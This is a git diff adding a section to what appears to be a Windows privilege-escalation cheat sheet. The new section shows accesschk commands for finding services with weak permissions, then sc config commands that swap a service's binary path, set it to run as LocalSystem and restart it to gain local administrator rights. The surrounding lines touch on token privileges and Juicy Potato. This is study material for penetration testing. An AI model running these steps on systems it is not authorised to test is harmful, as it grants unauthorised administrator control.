@@ -156,6 +156,27 @@ When you will open you will have evil to administrators groups:
  *  net localgroup Administrators
 
 ## Insecure Service Permissions
+* Detect is to find a service with weak permissions
+  * accesschk.exe -uwcqv *
+* For Shorten output
+  * accesschk.exe -uwcqv "Authenticated Users" *
+  * accesschk.exe -uwcqv "Everyone" *
+* The output will be the service name, the group name and the permissions that group has. Anything like SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS is a win. In fact any of the following permissions are worth looking out for:
+   * SERVICE_CHANGE_CONFIG
+   * SERVICE_ALL_ACCESS
+   * GENERIC_WRITE
+   * GENERIC_ALL
+   * WRITE_DAC
+   * WRITE_OWNER
+   
+* If you have reconfiguration permissions, or can get them through the above permission list, then you can use the SC command to exploit the vulnerability:
+   * sc config SERVICENAME binPath= "E:\Service.exe"
+   * sc config SERVICENAME obj=".\LocalSystem" password=""
+   * net stop SERVICENAME
+   * net start SERVICENAME
+
+* Stop and start the service again and you’re a Local Admin!
+
 ## Token Manipulation
 * whoami /priv
 * More info here: https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
@@ -201,4 +222,3 @@ When you will open you will have evil to administrators groups:
 1) https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges 
 2) https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato#:~:text=Juicy%20potato%20is%20basically%20a,this%2C%20we%20achieve%20privilege%20escalation.
 * Use: https://github.com/ohpe/juicy-potato
-
